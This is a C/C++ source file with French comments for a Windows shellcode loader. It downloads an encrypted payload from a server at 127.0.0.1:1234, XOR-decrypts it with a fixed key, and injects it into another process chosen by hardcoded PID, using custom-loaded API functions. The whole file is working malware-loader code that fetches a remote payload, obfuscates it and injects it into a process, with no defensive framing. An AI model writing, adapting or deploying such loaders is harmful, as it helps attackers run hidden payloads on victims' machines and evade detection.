#include <stdio.h>
#include <windows.h>
#include "utils.h"
#include "inject.h"
#include "http.h"
#include <iostream>
#include <cassert>


const unsigned char encryptionKey = 0xAA;
DWORD pid = 30632; // Si code d'erreur est virtaul alloc 5 =le logiciel n'est pas lancé |||| si code erreur 87 le PID mauvais 

int main()
{
    const SIZE_T sPayloadSize = 433;

    // On charge nos fonctions personnelles 
    ChargeDLL dll = { 0 };
    if (!chargerLib(&dll)) {
        printf("Erreur : Impossible de charger les fonctions nécessaires.\n");
        return 1;
    }

    // Allocation de l'emplacement mémoire à l'aide de la version personnalisé de VirtualAlloc
    assert(dll.pVirtualAlloc != NULL);
    void* allocatedMemory = dll.pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("Erreur : VirtualAlloc a échoué (Code : %lu)\n", GetLastError());
        return 1;
    }

    // On récupére le shellcode sur le server distant 1234 étant le port 
    // configurer pour accéder au serv et "serv/output2.bin" le chemin du fichier 
    // et 127.0.0.1 est l'adresse IP de notre serveur 


    LPSTR shell = Data(L"127.0.0.1", 1234, L"serv/output2.bin");
    const size_t SHELLCODE_SIZE = sPayloadSize; // Remplace sizeof(shell);

    // Partie déchiffrement du payload
    UCHAR decryptedPayload[SHELLCODE_SIZE] = {};
    for (size_t i = 0; i < sPayloadSize; ++i) {
        decryptedPayload[i] = shell[i] ^ encryptionKey;
    }

   // Injecte le shell code après le déchiffrement
    InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid, allocatedMemory);

}